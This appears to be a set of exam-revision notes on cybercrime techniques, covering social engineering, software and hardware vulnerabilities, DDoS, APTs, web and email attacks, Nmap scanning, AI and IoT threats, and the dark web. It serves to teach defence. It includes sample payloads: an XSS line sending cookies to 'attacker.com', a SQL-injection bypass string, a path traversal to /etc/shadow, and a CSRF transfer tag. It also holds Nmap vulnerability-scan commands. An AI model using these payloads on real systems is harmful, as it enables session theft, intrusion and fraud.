Topic 2.1

Digital Footprint

A Digital Footprint is the trail of data that a person or organisation leaves behind as a result of their activities in digital environments — intentional or not. Every online action — browsing a website, posting on social media, making a payment, logging into an app — contributes to this footprint. Cybercriminals systematically harvest and analyse digital footprints to profile targets, plan attacks, and evade detection.
📌 Last Night Tip
Two types: Active (data you consciously share — posts, profiles, form fills) and Passive (data collected without your awareness — cookies, IP logs, metadata). Cybercriminals use digital footprints in the Reconnaissance phase of an attack. OSINT (Open Source Intelligence) is the formal discipline of collecting footprint data from public sources.

Types of Digital Footprint

📢

Active Digital Footprint

Data deliberately shared by the user with full awareness — social media posts, comments, forum answers, profile details, uploaded photos, app registrations, email subscriptions, online forms, and e-commerce orders. The user consciously chose to create this data trail.

Facebook profile · LinkedIn bio · Reddit posts · Instagram photos · Google Form responses
👣

Passive Digital Footprint

Data collected about the user without their active input — browser cookies tracking visited sites, IP address logs on every server visited, GPS location data embedded in photos (EXIF), browsing history sold by ISPs, device fingerprinting, and advertising trackers following users across websites.

Cookies · Browser history · Device fingerprint · EXIF metadata · Ad tracking pixels

How Cybercriminals Exploit Digital Footprints

🎯

Target Profiling

Attackers compile detailed profiles using LinkedIn (job role, employer, colleagues), Facebook (personal life, family, location), Twitter/X (opinions, travel, events). This profile informs a highly personalised spear-phishing attack that the victim is far more likely to trust.

🔑

Password Guessing

Most people build passwords from personally meaningful information — pet names, birthdays, hometowns, sports teams. A digital footprint analysis often reveals all these details. Attackers build custom wordlists using tools like CUPP (Common User Passwords Profiler) from footprint data.

🕵️

OSINT-Based Reconnaissance

Using tools like Maltego, Shodan, theHarvester, and Google Dorking, attackers piece together email addresses, phone numbers, business relationships, infrastructure details, and location history — entirely from public sources before making a single direct contact with the victim.

💬

Social Engineering Leverage

Attackers use footprint information to create convincing pretexts — "I noticed you attended the Pune TechFest last month…" — that make victims lower their guard. The more specific the reference, the more the victim assumes the contact is legitimate and trustworthy.

📍

Location-Based Targeting

Geo-tagged social media posts, check-ins, and "away from home" travel announcements allow criminals to determine when a victim's home is empty (for physical burglary), where they regularly commute (for mugging), or their daily patterns (for stalking).

🧩

Identity Reconstruction

Even when individual data points seem harmless, combining them — name + employer + phone + email + photo + location — allows full identity reconstruction for identity theft, account takeover, or synthetic identity fraud (creating new fake identities from real fragments).

Real-World Example — EXIF Metadata Exposure
Case: A journalist in India posts a high-resolution photo on Twitter taken on their smartphone — seemingly just a workplace selfie. Unknown to them, the photo contains EXIF metadata including GPS coordinates (latitude/longitude), device model, date and time. An attacker extracts this metadata using online tools (Jeffrey's Exif Viewer, ExifTool) and maps the GPS co-ordinates — revealing the journalist's home address. This was used in a 2019 case of targeted harassment of journalists in India. Fix: Remove EXIF data before uploading using tools like ExifCleaner or use your phone's "remove location" setting when sharing photos.

Topic 2.2

Social Media and Social Engineering Tactics

Social Engineering is the art of manipulating people — rather than systems — into performing actions or divulging confidential information. It exploits human psychology rather than technical vulnerabilities: trust, authority, fear, urgency, helpfulness, and curiosity. Social media platforms have become the primary arena for social engineering because they provide attackers with rich target intelligence and direct communication channels.
📌 Last Night Tip
Kevin Mitnick — the world's most famous hacker — famously said: "The human factor is truly security's weakest link." Remember the 6 Cialdini Principles exploited in social engineering: Reciprocity, Authority, Scarcity, Social Proof, Liking, Commitment. The most common social engineering attacks are: Phishing, Vishing, Smishing, Pretexting, Baiting, Tailgating, Quid Pro Quo.

Social Engineering Attack Techniques

🎣

Phishing

Mass-sending fraudulent emails impersonating trusted entities (banks, IRCTC, PayTM, HDFC, Income Tax) to trick recipients into clicking malicious links, entering credentials on fake sites, or downloading malware-laden attachments. The most common cyber attack globally.

Fake SBI email: "Your account is suspended — verify now at sbi-secure-login.net"
🎯

Spear Phishing

Highly targeted phishing using specific personal details about the victim (gathered from digital footprint) to make the attack more convincing. Unlike mass phishing, the attacker crafts a unique message mentioning the victim's name, employer, role, recent activities, or colleagues.

"Hi Priya, your invoice from Cognizant IT Services (invoice #INV-4821) is attached…"
📞

Vishing (Voice Phishing)

Phone-based social engineering — attackers call victims impersonating bank officials, TRAI, CBI, police, or tech support. In India's "Digital Arrest" scam, attackers conduct fake video calls in police/CBI uniforms, intimidating victims into transferring money.

India's Digital Arrest scam — victims transferred ₹1,900 crore in 2023 (I4C data)
📱

Smishing (SMS Phishing)

Phishing delivered via SMS — "Your HDFC account is blocked. Click: hdfc-unblock.com" or fake OTPs. More effective than email phishing because SMS has no spam filter, appears on mobile home screen, and users are conditioned to respond to SMS alerts from banks.

"ALERT: Your UPI ID is deactivated. Reactivate: bit.ly/upi-verify" — fake NPCI SMS
🎭

Pretexting

Creating a fabricated scenario (pretext) to manipulate the target — e.g. impersonating an IT support technician who "needs your credentials to fix your account," or a journalist seeking comment, or a background verification agent confirming employment details.

Attacker poses as new employee's IT onboarding assistant to obtain VPN credentials
🖱️

Baiting

Leaving a malware-infected USB drive in a target organisation's car park, reception, or cafeteria — labelled "Salary Details Q3" or "HR Confidential." Curiosity drives victims to plug it in. Works equally well as online bait: free movies, cracked software, fake prizes.

USB drops outside corporate offices — found in Pentagon and US Army cases

Social Media as a Social Engineering Platform

Social media platforms — Facebook, Instagram, LinkedIn, Twitter/X, WhatsApp — provide attackers with three key capabilities:

  • Intelligence gathering: Public profiles reveal name, photo, employer, family, location, interests, relationships — all usable in crafting convincing attacks
  • Direct communication channel: Attackers can contact targets via DMs, friend requests from fake profiles, or by hijacking a trusted contact's compromised account
  • Amplification: Fake news, disinformation, and scam campaigns reach millions in hours via social sharing mechanisms
Attack Pattern — LinkedIn Job Scam (India 2023–24)
Step 1: Attacker creates a convincing LinkedIn profile of a "HR Manager at Infosys/TCS."
Step 2: Sends connection request to freshers and recent graduates — accepted because profile looks genuine.
Step 3: Messages victim with a "job offer" requiring a ₹2,000–₹5,000 "background verification fee" or "joining kit deposit."
Step 4: Victim pays via UPI — attacker immediately blocks them. Some variants install malware via a fake "joining document."
Losses: MHA I4C reported 1,14,000+ job-related fraud complaints in 2023 — total losses exceeding ₹900 crore.

Defending Against Social Engineering

🧠

Awareness Training

Regular security awareness training for all employees — simulated phishing campaigns, recognition of red flags (urgency, unusual sender, unexpected attachments, requests for credentials or payment). Studies show training reduces click rates on phishing emails by 60–80%.

✅

Verification Protocols

Always independently verify identity — call back on a known number, never the one provided in the suspicious message. No legitimate bank, IT support, or government agency will ever ask for OTPs, passwords, or UPI PINs over the phone or via SMS.

🔒

Technical Controls

Email gateway filtering, anti-phishing browser extensions, domain reputation checks, DKIM/SPF/DMARC email authentication to prevent spoofed sender addresses, and MFA on all critical accounts so stolen credentials alone are insufficient to log in.

Topic 2.3

Exploiting Vulnerabilities in Software and Hardware

A vulnerability is a weakness or flaw in a system — in code, configuration, design, or hardware — that an attacker can exploit to perform unauthorised actions. Exploitation is the act of leveraging a vulnerability to gain unauthorised access, execute malicious code, escalate privileges, or exfiltrate data. Software and hardware vulnerabilities form the technical foundation of most cybercrime techniques.

Types of Software Vulnerabilities

💉

SQL Injection (SQLi)

Inserting malicious SQL commands into input fields (login forms, search boxes) that are executed by the backend database. Allows attackers to bypass authentication, dump entire databases, modify or delete records, or execute system commands.

Input: ' OR '1'='1 → bypasses login without correct password
📜

Cross-Site Scripting (XSS)

Injecting malicious JavaScript into web pages viewed by other users. Stored XSS persists in the database; Reflected XSS is in the URL. Used to steal session cookies, redirect users to phishing sites, log keystrokes, or deface websites.

Stored XSS in a forum post: <script>document.location='attacker.com/steal?c='+document.cookie</script>
🔓

Buffer Overflow

Writing more data into a fixed-size memory buffer than it can hold — causing adjacent memory to be overwritten. Can crash the program, corrupt data, or allow the attacker to inject and execute arbitrary code (shellcode) at elevated privilege levels.

MS08-067 (Conficker worm) · Heartbleed (CVE-2014-0160) — OpenSSL buffer over-read
📂

Path Traversal

Using sequences like ../../../etc/passwd in file path inputs to access files outside the intended directory. Allows attackers to read sensitive system files, configuration files with stored credentials, or application source code.

URL: https://example.com/file?path=../../etc/shadow
🏭

Insecure Deserialization

Applications that deserialize (convert data from a stored format back to an object) untrusted data without validation allow attackers to inject malicious serialized objects — leading to remote code execution, privilege escalation, or denial of service.

Apache Struts RCE (CVE-2017-5638) — used in the Equifax breach exposing 147 million records
🌅

Zero-Day Vulnerabilities

Unknown vulnerabilities with no available patch — "zero days" of warning for defenders. Highly valuable on criminal markets — priced from $50,000 to over $1 million depending on target platform. Used in APTs, nation-state attacks, and ransomware delivery.

Log4Shell (CVE-2021-44228) — zero-day in Log4j library, affected millions of Java applications

Hardware Vulnerabilities

⚡

Spectre & Meltdown (CPU Flaws)

Discovered in 2018, these vulnerabilities exist in the speculative execution design of modern CPUs (Intel, AMD, ARM). They allow malicious code running in one process to read memory from other processes — potentially exposing passwords, encryption keys, and sensitive data. Cannot be fully patched in hardware — only mitigated in software with performance penalties.

CVE-2017-5753 (Spectre) · CVE-2017-5754 (Meltdown) — affect virtually all modern processors
📻

Firmware Vulnerabilities

Low-level software (firmware) running on routers, IoT devices, hard drives, and BIOS/UEFI is often never updated by users and may contain vulnerabilities that survive full OS reinstallation. Attackers can implant malware at the firmware level — nearly impossible to detect or remove without replacing hardware.

NSA's "EquationDrug" firmware implant persisted through hard drive reformatting
🔌

BadUSB / Malicious Peripherals

A USB device's controller firmware can be reprogrammed to act as a keyboard — and automatically type malicious commands when plugged in. "Rubber Ducky" and similar devices used in penetration testing can exfiltrate data or install backdoors in seconds, entirely bypassing antivirus since they appear as keyboards.

Rubber Ducky by Hak5 — widely available pentesting tool; misused in targeted attacks
📡

Supply Chain Hardware Implants

Malicious chips or modifications introduced during hardware manufacturing or distribution — before the device reaches the end user. The 2018 Bloomberg report alleged that Supermicro server motherboards sold to Amazon and Apple contained rice-grain-sized spy chips. Extremely difficult to detect and the most sophisticated hardware attack.

SolarWinds supply chain attack (2020) — malicious code inserted into software update
CVE Score (CVSS): Base Score = f(Attack Vector, Complexity, Privileges, User Interaction, Scope, Impact)

The Vulnerability Lifecycle

1 Discovery Vulnerability found — by researcher, vendor, or attacker. Zero-day at this point.
2 Disclosure Researcher reports to vendor (responsible disclosure) or publishes publicly (full disclosure).
3 CVE Assignment MITRE assigns CVE ID (e.g. CVE-2024-12345) — publicly catalogued in NVD.
4 Patch Development Vendor develops and tests security patch — typically 30–90 days from disclosure.
5 Patch Release Security update released to the public. Exploitation risk is now highest — attackers reverse-engineer the patch.
6 Patching by Users Organisations and users apply the patch — may take weeks to months. Unpatched systems remain exploitable indefinitely.

Topic 2.4

Use of Botnets and Distributed Denial-of-Service (DDoS) Attacks

A Botnet is a network of internet-connected devices — computers, smartphones, IoT devices — that have been secretly compromised by malware and are controlled remotely by an attacker (the "bot herder") via a Command-and-Control (C&C) server. Botnets are the infrastructure that powers DDoS attacks, spam campaigns, cryptocurrency mining, and credential stuffing. A DDoS (Distributed Denial-of-Service) attack uses this botnet army to flood a target with traffic until it collapses under the load.
📌 Last Night Tip
Difference between DoS (one machine attacks one target) and DDoS (thousands of bot machines attack one target — much harder to block). The Mirai Botnet (2016) infected IoT devices (CCTV cameras, routers) and launched the largest DDoS in history — 1.2 Tbps — taking down Twitter, Netflix, and Amazon simultaneously. DDoS attack types: Volumetric (flood bandwidth), Protocol (exhaust server resources — SYN flood), Application Layer (HTTP flood — hardest to detect).

How a Botnet is Created and Operated

1 Infection Devices infected via phishing emails, drive-by downloads, malicious ads, or exploiting unpatched vulnerabilities.
2 C&C Setup Bot malware connects back to a Command-and-Control server run by the attacker — receives instructions.
3 Propagation Bot scans for and infects other vulnerable devices autonomously — botnet grows exponentially.
4 Activation Bot herder sends command — all bots simultaneously execute the attack (DDoS flood, spam, mining).
5 Monetisation Attacker rents the botnet to others (DDoS-for-hire), uses it for crypto mining, or sells stolen data.

Types of DDoS Attacks

🌊

Volumetric Attacks

Flood the target with massive amounts of traffic — typically UDP floods or ICMP floods — consuming all available bandwidth. Measured in Gbps or Tbps. Simple but highly effective. Amplification attacks use DNS/NTP servers to multiply traffic volume by 50–100x using forged source IPs.

UDP Flood · ICMP Flood · DNS Amplification · NTP Amplification
🤝

Protocol Attacks (SYN Flood)

Exploit weaknesses in network protocol implementations — the SYN flood sends thousands of TCP connection requests with spoofed IPs. The server allocates resources waiting for confirmation that never comes — exhausting the connection table and refusing legitimate users.

SYN Flood · Ping of Death · Smurf Attack · Fragmentation Attacks
🌐

Application Layer (L7) Attacks

HTTP floods targeting the application layer — sending large numbers of seemingly legitimate HTTP GET/POST requests that each require significant server processing. Harder to detect because individual requests look normal. Slowloris keeps connections open indefinitely to exhaust server threads.

HTTP Flood · Slowloris · RUDY (R-U-Dead-Yet) · WordPress XML-RPC flood
💰

Ransom DDoS (RDDoS)

Attackers send extortion demands threatening a devastating DDoS attack unless Bitcoin payment is made. Often demonstrate capability with a short "warning" attack first. Emerged as a significant threat to financial institutions, e-commerce platforms, and online gaming companies.

Lazarus Bear Armada (LBA) — extorted banks and exchanges threatening 2 Tbps attacks
⚠️ Notable Indian DDoS Incidents
AIIMS Delhi (Nov 2022): Ransomware combined with DDoS disrupted hospital services for 15 days — patient records of 3–4 crore people compromised. Indian Council of Medical Research (ICMR, 2022): 6,000+ hacking attempts per minute. Bombay Stock Exchange: Periodic DDoS attempts during market hours — high-impact target due to financial sensitivity of timing.

Topic 2.5

Advanced Persistent Threats (APTs)

An Advanced Persistent Threat (APT) is a prolonged, highly targeted cyber attack in which an attacker — typically a nation-state or state-sponsored group — gains unauthorised access to a target network and remains undetected for months or years, continuously extracting sensitive data. The three defining characteristics are: Advanced (sophisticated tools and techniques), Persistent (long-term presence, months to years), and Threat (determined human adversary with specific objectives).
📌 Last Night Tip
APT actors: APT28 / Fancy Bear (Russia · GRU), APT29 / Cozy Bear (Russia · SVR), APT41 (China · state-sponsored), Lazarus Group (North Korea · financially motivated), OilRig (Iran). APTs use the Cyber Kill Chain (Lockheed Martin model — 7 stages). Unlike regular cybercrime, APT objective is intelligence gathering, sabotage, or long-term financial theft — not quick one-time attacks.

APT Kill Chain — 7 Stages

1 Reconnaissance OSINT, social media analysis, spear-phishing target identification, scanning infrastructure
2 Weaponisation Create weaponised payload — malware embedded in Word doc / PDF / link tailored to target
3 Delivery Spear-phishing email, watering hole attack, compromised supply chain, USB drop
4 Exploitation Exploit zero-day or known vulnerability to execute malware on target system
5 Installation Install backdoor / RAT (Remote Access Trojan) — establish persistent access that survives reboots
6 C&C Establish encrypted covert Command & Control channel — beacon out to attacker infrastructure
7 Exfiltration Move laterally, escalate privileges, collect and quietly exfiltrate target data over months

Characteristics That Distinguish APTs from Regular Attacks

CharacteristicRegular CybercrimeAPT
DurationHours to days — hit and runMonths to years — persistent presence

Landmark APT Case — Operation ShadowHammer (ASUS, 2019)
Actor: APT41 (China-linked). Method: Compromised ASUS's software update server — malware was digitally signed with ASUS's legitimate certificate and pushed to ~1 million ASUS users via official updates. Only ~600 specific MAC addresses were targeted for second-stage payload. Discovery: Kaspersky Lab found the backdoor months after deployment. Lesson: Even legitimate, digitally-signed software updates from trusted vendors cannot be implicitly trusted — supply chain is an APT vector.

Topic 2.6

Web Attacks: Browser Attacks & Web Attacks Targeting Users

Web attacks exploit vulnerabilities in browsers, web applications, and the protocols that connect them — to compromise users or servers. They are the most prevalent category of attacks because the web browser is now the primary interface for banking, commerce, communication, and work — making it the highest-value target for cybercriminals.

Browser-Based Attacks

🚗

Drive-by Download

Malware automatically downloaded and installed when a user merely visits a compromised or malicious website — without any clicking or confirmation. Exploits browser vulnerabilities (JavaScript engine, PDF plugin, media player). User sees nothing unusual; infection is completely silent.

Visiting a fake news article that secretly exploits a Chrome zero-day to install spyware
🔗

Malvertising

Injecting malicious code into legitimate online advertising networks — the malicious ad appears on reputable, high-traffic websites (news portals, government sites). Users are infected simply by viewing the page, even without clicking the ad. Hard to defend against as the malicious code comes from trusted ad networks.

Major Indian news portals have unknowingly served malvertising — affecting lakhs of readers
🍪

Session Hijacking (Cookie Theft)

Stealing a user's authenticated session cookie — typically via XSS attacks, network sniffing on unencrypted connections, or malware — allows the attacker to impersonate the victim on any website where they are logged in, without needing their password. Bypasses MFA entirely as the session is already authenticated.

Attacker steals Gmail session cookie → accesses entire Google account without password
🧩

Browser Extension Malware

Malicious browser extensions appear as useful utilities (PDF converters, ad blockers, currency converters) but secretly steal passwords, redirect searches, inject ads, read all visited pages, or access banking sessions. Available even on Chrome Web Store and Firefox Add-ons — poorly moderated.

DataSpii extension — secretly exfiltrated browsing history of 4 million users including healthcare and legal data
🕳️

Clickjacking (UI Redressing)

Overlaying an invisible malicious iframe over a visible legitimate button — when the user thinks they're clicking "Play Video," they're actually clicking "Confirm Bank Transfer." Used to trick users into enabling camera/microphone, following attackers on social media, or approving financial transactions.

Invisible Facebook "Like" button placed over a video play button — like campaign manipulation
🔀

Man-in-the-Browser (MitB)

Malware (Zeus, SpyEye) sits inside the browser as a plugin and intercepts all communication between the user and websites — in real-time. When the user logs into internet banking and initiates a transfer, the MitB malware silently changes the destination account and amount — the victim sees the correct transaction on screen while a different one is processed.

Zeus malware — stole over $100 million from US banks using MitB before takedown in 2010

Web Attacks Targeting Users

🔄

Cross-Site Request Forgery (CSRF)

Tricks a logged-in user's browser into sending an authenticated request to a web application without the user's knowledge. If a user is logged into their bank and visits a malicious site, hidden HTML can force a money transfer request that the bank's server accepts as legitimate (since it carries the user's valid session cookie).

Hidden form: <img src="bank.com/transfer?to=attacker&amount=50000">
🌐

DNS Spoofing / DNS Cache Poisoning

Corrupting a DNS server's cache to resolve a legitimate domain (e.g. hdfc.com) to the attacker's IP address — redirecting all visitors to a fake phishing site while the browser's address bar still shows the correct legitimate URL. Victims see no warning and enter credentials on the fake site.

Kaminsky Attack (2008) — demonstrated practical DNS cache poisoning against any nameserver
🧑‍💻

Watering Hole Attack

Attacker identifies websites frequently visited by the target group (e.g. an industry forum visited by defence engineers) and compromises that site — injecting malware that infects all visitors. Like a predator poisoning a watering hole. Used by APTs to target specific industries without direct contact with the target organisation.

APT32 (Vietnam) compromised Vietnamese government websites to infect visiting civil servants
🔒

SSL Stripping (HTTPS Downgrade)

In a Man-in-the-Middle position, the attacker intercepts the user's initial HTTP request and establishes HTTPS connection with the bank on their behalf — presenting plain HTTP to the victim. The victim's browser shows HTTP (no padlock) but they often don't notice. All credentials are captured in plaintext by the attacker.

Tool: SSLstrip by Moxie Marlinspike — demonstrated at Black Hat 2009

Topic 2.7

Obtaining User or Website Data & Email Attacks

This topic covers the techniques attackers use to harvest user credentials and sensitive website data — through database attacks, credential stuffing, and data breaches — and the distinct category of email-based attacks, which remain the primary delivery vector for cybercrime globally. Over 90% of all cyberattacks begin with a malicious email.

Methods of Obtaining User & Website Data

🗃️

Database Breaches (SQL Injection)

The most common method of mass data theft — exploiting SQL injection vulnerabilities in web applications to dump entire user databases containing usernames, hashed passwords, email addresses, phone numbers, and payment data. Stolen databases are sold on dark web marketplaces.

2021: MobiKwik breach — 3.5 million users' KYC data including Aadhaar numbers sold on dark web
🔑

Credential Stuffing

Using lists of username/password combinations from previous data breaches (available on dark web) and automatically testing them against hundreds of other services — exploiting people's habit of reusing the same password everywhere. Completely automated using tools like Sentry MBA, Snipr, or custom scripts.

If your Zomato password is the same as your HDFC net banking password — a Zomato breach compromises your bank account
⌨️

Keylogging

Malware that records every keystroke — capturing passwords, credit card numbers, personal messages, and search queries as they are typed. Software keyloggers are delivered via malware; hardware keyloggers are physical devices plugged between keyboard and computer (used in ATM skimming and cybercafé attacks).

Keyloggers found installed on cybercafé computers targeting bank logins across India
🌐

Web Scraping for PII

Automated extraction of personal information from websites, social media profiles, company directories, and public databases — at scale. While some scraping is legal, scraping personal data without consent violates DPDPA 2023 and is used for building target lists for phishing, identity theft, and spam campaigns.

LinkedIn scraping of 500 million profiles (April 2021) — data sold on hacker forums
🎭

Phishing for Credentials

Creating pixel-perfect replicas of login pages (SBI, Gmail, PayTM) on lookalike domains (sbionline.net, gmail-verify.com) and directing victims there via phishing emails, SMS, or social media. When victims enter credentials on the fake site, they are captured and immediately tested by the attacker.

Evilginx2 — adversary-in-the-middle phishing tool that steals session tokens, bypassing MFA
📸

Formjacking

Injecting malicious JavaScript into e-commerce checkout pages that silently copies payment card details as customers fill out the form — transmitted to the attacker in real time while the legitimate transaction also proceeds normally. The Magecart group's signature technique — attacked British Airways, Ticketmaster, and hundreds of Indian e-commerce sites.

Magecart — stole 380,000 British Airways customers' card details over 15 days in 2018

Email Attacks

👔

Business Email Compromise (BEC)

Attacker impersonates a CEO, CFO, or vendor via spoofed or compromised email — instructing the finance department to urgently transfer funds to a fraudulent account. The most financially devastating email attack: FBI reported $2.7 billion in BEC losses in 2022 globally. India: ₹500+ crore in BEC fraud annually.

Email from fake "CEO": "Wire ₹50 lakh to our new vendor account immediately — confidential deal, don't discuss with anyone"
📎

Malicious Attachment Attacks

Emails carrying malware-infected attachments — macro-enabled Word/Excel documents ("Enable macros to view this salary slip"), PDF exploits, JavaScript files, or executable files masquerading as invoices or shipping notifications. The most common ransomware delivery mechanism.

Emotet malware — delivered via malicious Word macros in "invoice" emails — infected millions
📧

Email Spoofing

Forging the "From" field of an email to make it appear to come from a trusted sender (support@hdfc.com, payroll@yourcompany.com) — exploiting the fact that legacy email protocols (SMTP) have no sender authentication. Countered by DKIM, SPF, and DMARC records but many organisations have not implemented them.

Spoofed email from "income-tax@gov.in" — tax refund phishing claiming ₹12,340 refund pending
💣

Email Bombing

Flooding a target's inbox with thousands of emails — to distract them while a separate fraudulent transaction (password reset, bank transfer, account takeover) takes place. The victim cannot find the critical notification (e.g. "Your password was changed") buried in thousands of subscription confirmation emails triggered by the attacker.

Attacker subscribes victim's email to 10,000 newsletters → victim misses the "Your bank password was changed" alert

Topic 2.8

Network Vulnerabilities: Overview of Vulnerability Scanning with Nmap

Network vulnerability scanning is the systematic process of identifying open ports, running services, software versions, and known vulnerabilities on networked systems — before attackers do. Nmap (Network Mapper) is the most widely used open-source network scanner, created by Gordon Lyon ("Fyodor") in 1997. It is used by both ethical hackers (to secure networks) and attackers (to identify targets) — making it both a defensive and offensive tool depending on authorization.
📌 Last Night Tip
Nmap is used in the Reconnaissance and Scanning phases of penetration testing. Key scan types to remember: -sS (SYN/Stealth scan — default), -sV (Version detection), -O (OS detection), -A (Aggressive — all of the above), -p (specify ports), -sn (Ping scan/host discovery — no port scan). Always get written permission before scanning any network you do not own.

Common Network Vulnerabilities Detected by Scanning

🚪

Open Ports & Services

Every open port is a potential entry point. Telnet (23), FTP (21), RDP (3389), SMB (445) — if left open and unpatched, these are primary targets. Nmap identifies all listening ports and the service/version running on each.

🔓

Default Credentials

Routers, cameras, and IoT devices shipped with default passwords (admin/admin, admin/password) that are never changed. Nmap scripts (NSE) can test for default credentials on identified services — a common vulnerability in home and SME networks.

🔧

Unpatched Services

Running outdated versions of Apache, OpenSSH, MySQL, or Windows services with known CVEs. Nmap's -sV flag identifies version numbers — which can be cross-referenced with the NVD to find known exploitable vulnerabilities immediately.

Essential Nmap Commands

# ── BASIC HOST DISCOVERY ──────────────────────────────────── nmap -sn 192.168.1.0/24 # Ping scan — discover live hosts (no port scan) nmap 192.168.1.1 # Default scan — top 1000 TCP ports # ── PORT SCANNING ─────────────────────────────────────────── nmap -sS 192.168.1.1 # SYN stealth scan (requires root) — fastest & most common nmap -p 80,443,22,3306 192.168.1.1 # Scan specific ports only nmap -p- 192.168.1.1 # Scan ALL 65535 ports nmap -sU 192.168.1.1 # UDP scan (slower — DNS:53, SNMP:161, NTP:123) # ── SERVICE & VERSION DETECTION ───────────────────────────── nmap -sV 192.168.1.1 # Detect service name and version on open ports nmap -O 192.168.1.1 # OS fingerprinting — detect operating system nmap -A 192.168.1.1 # Aggressive: OS + version + scripts + traceroute # ── NSE SCRIPTING ENGINE ──────────────────────────────────── nmap --script vuln 192.168.1.1 # Run all vulnerability detection scripts nmap --script http-title 192.168.1.1 # Grab webpage titles from web servers nmap --script smb-vuln-ms17-010 192.168.1.1 # Check for EternalBlue (WannaCry) vulnerability # ── OUTPUT ────────────────────────────────────────────────── nmap -oN scan_results.txt 192.168.1.0/24 # Save output in normal readable format nmap -oX scan_results.xml 192.168.1.0/24 # Save output in XML (for import into Metasploit)

Topic 2.9

Impact of Emerging Technologies — AI and IoT on Cybercrime

Artificial Intelligence (AI) and the Internet of Things (IoT) are transforming cybercrime in fundamentally different ways. AI dramatically lowers the technical skill barrier for attackers, enables attacks at unprecedented scale, and makes deception more convincing. IoT massively expands the attack surface — billions of insecure connected devices form the new battleground and a new resource pool for cybercriminals.

Artificial Intelligence — How It Empowers Cybercriminals

✍️

AI-Generated Phishing

Large Language Models (LLMs) generate grammatically perfect, contextually relevant, culturally appropriate phishing emails in any language — at zero cost and infinite scale. Traditional defences that relied on spotting spelling errors and awkward phrasing in phishing emails no longer work. AI-crafted spear phishing targeting specific individuals is now within reach of low-skilled attackers.

🎙️

Voice Cloning (Vishing 2.0)

With just 3–10 seconds of audio (from a YouTube video, public speech, or phone call), AI voice cloning tools (ElevenLabs, Resemble AI) can generate realistic real-time voice mimicry. Used in CEO fraud — an employee receives a "phone call from the CEO" instructing an urgent wire transfer. The voice is indistinguishable from the real person.

🎬

Deepfakes for Fraud

AI-generated realistic video of real people saying things they never said — used for sextortion (placing a victim's face on pornographic content), corporate fraud (fake CEO video authorising transactions), political disinformation, and bypassing video-based KYC identity verification in banks and crypto exchanges.

🔍

AI-Assisted Vulnerability Discovery

AI tools analyse vast codebases to automatically discover security vulnerabilities — both for defenders (automated security testing) and attackers (fuzzing tools guided by ML). AI can generate working exploit code for known vulnerabilities, dramatically reducing the time from vulnerability discovery to working exploit.

🔑

Password Cracking Acceleration

AI-powered password cracking (PassGAN, ML-guided hashcat attacks) learns patterns from previously breached password databases and generates highly probable guesses — cracking passwords 6x faster than traditional dictionary/brute-force approaches. Renders many "common" passwords vulnerable much faster than previously.

🛡️

AI Evasion of Security Tools

Attackers use AI to mutate malware — automatically generating new variants that evade signature-based antivirus detection. AI can test thousands of evasion techniques against known antivirus engines in minutes, producing a variant specifically designed to bypass a target organisation's security stack.

Internet of Things (IoT) — The Expanding Attack Surface

By 2030, an estimated 29 billion IoT devices will be connected globally — smart TVs, IP cameras, smart meters, medical devices, industrial sensors, smart home appliances, vehicles. Most share critical security weaknesses:

🔐

Weak Default Credentials

Most IoT devices ship with default username/password combinations (admin/admin, root/root) that users never change. The Mirai botnet (2016) compromised 600,000+ IoT devices using just 60 default credential combinations — then launched the largest DDoS attack in history.

🔧

No Patch Mechanism

Many IoT devices run embedded Linux or custom firmware with no automatic update mechanism — vulnerabilities are never patched. Smart TVs, routers, and IP cameras from 2018 are still connected in 2025 with the same unpatched firmware. Their vulnerabilities are publicly known but will never be fixed.

🏥

Critical Infrastructure Risk

Medical IoT devices (insulin pumps, pacemakers, hospital patient monitors), industrial control systems (power grids, water treatment), and smart city infrastructure — if compromised, attacks move from data theft to physical harm and potential loss of life. Ransomware on hospital IoT directly threatens patient safety.

Real Case — AI Deepfake CFO Fraud (Hong Kong, 2024)
Attack: A finance employee at a multinational company received a video conference invite from the "CFO." During the call, the CFO and multiple other executives appeared on camera and instructed the employee to transfer HK$200 million (≈₹215 crore) as part of a confidential deal. All participants — including the CFO — were AI deepfake avatars generated from public video footage. The employee transferred the money before discovering the fraud. Significance: First confirmed large-scale deepfake video conference fraud case — signals a new category of attack that bypasses even video verification.

Topic 2.10

The Dark Web and Cybercrime

The Dark Web is a subset of the internet that is not indexed by standard search engines and requires specialised software (primarily the Tor browser) to access. It provides anonymity to both the operator and visitor through onion routing — encrypting traffic through multiple relay nodes globally. While the dark web has legitimate uses (journalist-source protection, privacy advocacy in authoritarian regimes), it has become the primary marketplace and communication platform for cybercriminals.
📌 Last Night Tip — Three Layers of the Internet
Surface Web (~5%): Indexed by Google, publicly accessible — news sites, Wikipedia, social media. Deep Web (~90%): Not indexed — emails, bank portals, medical records, subscription content, intranet — not inherently criminal. Dark Web (~5% of deep web): Requires Tor, not indexed — anonymous — both legitimate and criminal use. The Dark Web is a small subset of the Deep Web — not everything "deep" is dark or criminal.

How the Dark Web Works — Tor and Onion Routing

1 Tor Client User's Tor browser encrypts data in three layers (like onion layers) — one for each relay node
2 Entry Node First relay knows user's IP but not destination or content — strips outer encryption layer
3 Middle Node Only knows previous and next node — cannot see origin IP or destination — strips middle layer
4 Exit Node Knows destination but not origin IP — strips final layer and delivers request to .onion site
5 .onion Site Hidden service — only accessible via Tor — server location also concealed through same mechanism

Dark Web Cybercrime Ecosystem

🛒

Dark Web Marketplaces

Amazon-like platforms selling illegal goods and services — drugs, stolen credit card data, identity documents, hacking tools, exploit kits, and counterfeit currency. Operated with cryptocurrency payments and customer reviews. Hydra (Russia), AlphaBay, Silk Road were/are major examples.

Silk Road (2011–2013): $1.2 billion in Bitcoin transactions before FBI takedown · Hydra: $1.3 billion/year before 2022 German police seizure
💳

Carding Forums & Data Markets

Platforms selling stolen credit/debit card details, complete identity packages ("fullz" — name, DOB, SSN/Aadhaar, bank details, mother's maiden name), SIM swap credentials, and OTP bypass services. Indian card data regularly appears on markets like BidenCash and AllWorld Cards.

BidenCash leaked 2.1 million Indian credit cards in Oct 2022 — many still active at time of breach
🦠

Malware-as-a-Service (MaaS)

Ransomware kits, RATs, spyware, keyloggers, and banking trojans sold or rented with full technical support, customer dashboards, and update subscriptions. Ransomware gangs (LockBit, REvil, Conti) operate as businesses — franchising their ransomware to affiliates for 20–30% of collected ransoms.

LockBit 3.0 offered "bug bounty" for their own ransomware — operated support chat — $91 million extracted from US organisations alone
💰

Cryptocurrency & Money Laundering

